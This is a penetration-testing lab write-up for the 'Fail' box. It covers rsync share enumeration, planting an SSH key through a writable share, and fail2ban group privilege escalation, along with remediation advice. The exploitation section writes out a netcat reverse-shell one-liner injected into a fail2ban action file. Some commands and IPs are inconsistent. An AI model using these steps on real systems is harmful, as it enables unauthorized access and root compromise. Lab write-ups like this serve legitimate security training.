---
Alias: Fail
Date: 5/3/2022
Platform: Linux
Difficulty: Intermediate
Tags: #RsyncShare #Fail2BanPrivilegeEscalation #CreateAutorized_KeysSSHfile
Status: Finished
IP: 192.168.143.126
---

# {{Fail}}


# Resolution summary
- Located Rsync share
- Discovered Files that I upload can be located in the rsync share's user fox's home directory.
- To enable SSH login, I created an authorized_keys file in Fox's home directory.
- The discovered user belongs to the fail2ban group.
- Looked up ways to escalate privileges for a user who belongs to the fail2ban group on Google
- After completing the privilege escalation procedures, a root shell was obtained.


## Improved skills
- Increased knowledge of rsync
- Learned of the fail2ban group

## Used tools
- nmap
- rustscan

### **Vulnerability Fix:** Initial Foothold
#### Create An SSH Key In A Writable Rsync Share

1. **Restrict Write Access:** Configure rsync shares to be read-only unless write access is absolutely necessary. If write access must be enabled, ensure it's restricted to authenticated and authorized users.
    
2. **Implement Strong Authentication:** Use rsync over SSH or set up rsync daemon authentication to control access to rsync shares. This ensures that only users with the correct credentials can access the shares, significantly reducing the risk of unauthorized write access.
    
3. **Use Firewalls and Access Control Lists (ACLs):** Restrict network access to the rsync daemon using firewalls and Access Control Lists. Limit access to trusted IP addresses or networks to reduce the attack surface.
    
4. **Regularly Review and Audit Share Permissions:** Periodically audit rsync configurations and permissions to ensure that they remain secure and reflect current access needs. Remove unnecessary write permissions and shares that are no longer in use.
    
5. **Secure Sensitive Data:** Avoid using rsync for synchronizing sensitive data unless the data can be encrypted in transit and access is tightly controlled. Consider alternative secure file transfer methods for highly sensitive information.
    
6. **Monitor Logs for Suspicious Activity:** Enable logging on the rsync server and monitor logs for any unusual or unauthorized access patterns. This can help in early detection of an attack or misuse.
    
7. **Educate Administrators and Users:** Ensure that those responsible for configuring and maintaining rsync shares are aware of the security risks and best practices for securing rsync.
    
8. **Update and Patch:** Keep the rsync software up to date with the latest patches and versions. Although this specific vulnerability is due to configuration, staying updated can protect against other potential vulnerabilities.
    
9. **Backup Important Data:** Regularly backup critical data. In case of data corruption or unauthorized modification, backups can provide a recovery path to restore lost or compromised files.
    

By carefully configuring rsync shares, restricting access, and monitoring use, organizations can mitigate the risks associated with writable rsync share vulnerabilities and protect their data and systems from unauthorized access or modification.


### **Vulnerability Explanation:** Privilege Escalation
#### Fail2Ban group privelege escalation

#### Title: Vulnerability Due to Improper Fail2Ban Group Configuration

#### Type of Vulnerability: Security Misconfiguration

#### CWE Reference: CWE-16: Configuration

#### Proposal for CVSS Score: 5.3 (Medium)

- **CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N**
- The medium score is justified by the potential network accessibility, low attack complexity, no privileges required, and no user interaction. The impact is primarily on integrity, with no direct impact on confidentiality or availability.

#### Generic Description:

Fail2Ban is an intrusion prevention software framework that protects computer servers from brute-force attacks. It monitors log files (e.g., /var/log/auth.log, /var/log/apache/access.log) and bans IPs that show malicious signs such as too many password failures, seeking for exploits, etc. A vulnerability arises when Fail2Ban is improperly configured, particularly regarding the group permissions assigned to the Fail2Ban service or the files it needs to access. This misconfiguration can hinder Fail2Ban's ability to modify firewall rules or access log files, potentially allowing attackers more time to exploit services due to ineffective banning.

#### Specific Description:

This vulnerability specifically concerns scenarios where Fail2Ban is set up with insufficient permissions due to being assigned to an incorrect or inadequately privileged group. For instance, if Fail2Ban cannot access certain log files because it's not part of the required group to read them, or if it cannot execute firewall rules due to insufficient permissions, attackers could continue their brute-force attempts without being blocked. The effectiveness of Fail2Ban relies on its ability to promptly read logs and update firewall rules, which is compromised in such a configuration mishap.


### **Vulnerability Fix:** Privilege Escalation
#### Fail2Ban group privelege escalation

#### Remediation Plan:

1. **Review Fail2Ban Configuration:** Regularly review the Fail2Ban configuration files and ensure that it is correctly set up to read all necessary log files. Verify that the Fail2Ban service is running with appropriate permissions to execute all its required actions, such as modifying firewall rules.
    
2. **Correct Group Permissions:** Ensure that the Fail2Ban process runs as a user with the necessary group memberships to access log files and execute system commands for banning IPs. This typically means being part of the adm or root group, depending on the system setup and what logs need to be accessed.
    
3. **Limit Fail2Ban Access:** While ensuring that Fail2Ban has sufficient permissions to perform its duties, also ensure that its permissions are limited to what is necessary for operation to follow the principle of least privilege, reducing the risk of exploitation.
    
4. **Secure and Monitor Configuration Files:** Protect Fail2Ban configuration files from unauthorized access and modifications. Monitor these files for unauthorized changes.
    
5. **Update and Patch Fail2Ban:** Regularly update Fail2Ban to the latest version to benefit from security patches, new features, and improved stability.
    
6. **Implement Logging and Alerting:** Enable comprehensive logging for Fail2Ban actions and monitor these logs for signs of misconfiguration or failure to ban attacking IPs. Set up alerting for critical Fail2Ban events to quickly address configuration issues or update firewall rules as needed.
    
7. **Regular Testing:** Periodically test Fail2Ban rules and configurations in a controlled environment to ensure they are effective against known attack patterns and that log file monitoring and IP banning are functioning as expected.
    
8. **Documentation and Training:** Maintain clear documentation on the Fail2Ban setup and configuration process. Train relevant IT staff on proper Fail2Ban configuration and maintenance to prevent misconfiguration issues.
    

By addressing these potential configuration vulnerabilities in Fail2Ban setups, organizations can enhance their server security posture and ensure effective protection against brute-force and other automated attacks.

---

# Information Gathering
Scanned all TCP ports:
```bash
rustscan --addresses 192.168.143.126 --ulimit 5000 -- -A -sC -Pn -sV -T 1500
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/brian/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.143.126:22
Open 192.168.143.126:873
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -A -sC -Pn -sV -T 1500" on ip 192.168.143.126
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-16 10:12 PDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:12
Completed NSE at 10:12, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:12
Completed NSE at 10:12, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:12
Completed NSE at 10:12, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 10:12
Completed Parallel DNS resolution of 1 host. at 10:12, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 10:12
Scanning 192.168.127.126 [2 ports]
Discovered open port 22/tcp on 192.168.143.126
Discovered open port 873/tcp on 192.168.143.126
Completed Connect Scan at 10:13, 30.09s elapsed (2 total ports)
Initiating Service scan at 10:13
Scanning 2 services on 192.168.143.126
Completed Service scan at 10:13, 0.33s elapsed (2 services on 1 host)
NSE: Script scanning 192.168.143.126.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:13
Completed NSE at 10:13, 2.40s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:13
Completed NSE at 10:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:13
Completed NSE at 10:13, 0.00s elapsed
Nmap scan report for 192.168.143.126
Host is up, received user-set (0.078s latency).
Scanned at 2022-10-16 10:13:02 PDT for 17s

PORT    STATE SERVICE REASON  VERSION
22/tcp  open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGcX/x/M6J7Y0V8EeUt0FqceuxieEOe2fUH2RsY3XiSxByQWNQi+XSrFElrfjdR2sgnauIWWhWibfD+kTmSP5gkFcaoSsLtgfMP/2G8yuxPSev+9o1N18gZchJneakItNTaz1ltG1W//qJPZDHmkDneyv798f9ZdXBzidtR5/+2ArZd64bldUxx0irH0lNcf+ICuVlhOZyXGvSx/ceMCRozZrW2JQU+WLvs49gC78zZgvN+wrAZ/3s8gKPOIPobN3ObVSkZ+zngt0Xg/Zl11LLAbyWX7TupAt6lTYOvCSwNVZURyB1dDdjlMAXqT/Ncr4LbP+tvsiI1BKlqxx4I2r
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA=
|   256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+
873/tcp open  rsync   syn-ack (protocol version 31)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:13
Completed NSE at 10:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:13
Completed NSE at 10:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:13
Completed NSE at 10:13, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.11 seconds

```

Enumerated open TCP ports:
```bash
873
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 873 -Rsync

-We discovered the "hacktricks" website when searching for a method to enumerate shares using port 873: "nmap -sV — script “rsync-list-modules” -p [Port] [IP]"

![](Images/Pasted%20image%2020221015215909.png)

- We locate the share fox by typing the following: 

nmap -sV -script "rsync-list-modules" -p 873 192.168.143.126

![](Images/Pasted%20image%2020221015220513.png)
#RsyncShare

- Searching for port 873 enumeration on Google yields the following webpage, which explains how to list files and directories from the rsync server.
  
![](Images/Pasted%20image%2020221015220950.png)

![](Images/Pasted%20image%2020221015221123.png)

- After typing "rsync -r 192.168.143.126::fox," we discovered the files and directories below, which displayed the user "fox" home directory. We then used "rsync -av fox@192.168.143.126::fox/" to download all of the files and directories to our local system.
  
![](Images/Pasted%20image%2020221015221356.png)

![](Images/Pasted%20image%2020221015221635.png)

-After reading the data, we discover nothing intriguing.
	
- We attempt to upload files to the user’s “fox” home directory by running the following commands: “echo “hello world” > testfile.txt” and “rsync testfile.txt -r 192.168.143.126::fox” to check if the file has been uploaded.
  
![](Images/Pasted%20image%2020221015221837.png)

- The previous website provided the following instructions on how to carry out these actions:
  
![](Images/Pasted%20image%2020221015222046.png)

- We search for "port 873 enumeration" on Google and discover the hacktricks page that explains how to copy every file from an rsync server to our local machine:

![](Images/Pasted%20image%2020221015222900.png)


- Next, we transfer every rsync file to our Kali machine.
  
---

# Exploitation


- In order to create an authorized_keys file in Fox's home directory and commence an SSH session, we input the following commands:
-
mkdir fox
cd fox
mkdir .ssh
cd .ssh
touch id_rsa.pub
ssh-keygen -t rsa
[Enter file in which to save the key (/home/kali/.ssh/id_rsa):] "/home/kali/Downloads/ProvingGroundsBoxes/Fail/fox/.ssh/id_rsa.pub"
[Enter passphrase (empty for no passphrase):] "password"
[Enter same passphrase again:] "password"
sudo mv id_rsa_pub authorized_keys
cd ..
rsync -avp fox/ fox@192.168.120.149::fox/

- We navigate to the directory where the "id_rsa" file was produced.

- To set the proper permissions for the SSH key, we type "chmod 600".
  
- We enter "ssh -I id_rsa fox@192.168.143.126" to log in.

- We establish an SSH session as user fox by entering "password" as the password.
  
![](Images/Pasted%20image%2020221016090756.png)

---

# Privilege Escalation
## Local Enumeration

- We download the LinEnum.sh script on the target machine

- After running the "LinEnum.sh" script, we discover that user "fox" belongs to the "fail2ban" group:

![](Images/Pasted%20image%2020221016091122.png)

- After searching for "fail2ban privilege escalation" on Google, we discover the following web page that outlines how to do so:
  
![](Images/Pasted%20image%2020221016091817.png)

![](Images/Pasted%20image%2020221016091921.png)

![](Images/Pasted%20image%2020221016092000.png)

![](Images/Pasted%20image%2020221016092047.png)

![](Images/Pasted%20image%2020221016092139.png)

![](Images/Pasted%20image%2020221016092235.png)
#Fail2BanPrivilegeEscalation 

---

## Privilege Escalation vector
## Fail2Ban group privelege escalation

- Following the preceding procedures, we enter "ls –la" into the "/etc/fail2ban/action.d" directory and discover that group "fail2ban" has write permissions on the file "iptables-multiport-log.conf":
  
![](Images/Pasted%20image%2020221016100412.png)

- We type "vim iptables-multiport-log.conf"

- Next, in the file at the end, we input "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc [our kali IP] 85 >/tmp/f" to initiate a reverse shell on port 85.
  
![](Images/Pasted%20image%2020221016100629.png)

- On our Kali machine, we launch a "penelope" listener listening on port 85.
  
- Then, we received a root shell on our penelope listener after entering "ssh @fox192.168.236.126" and entering random passwords to force "fail2ban" to block our IP address.
  
![](Images/Pasted%20image%2020221016111525.png)
---

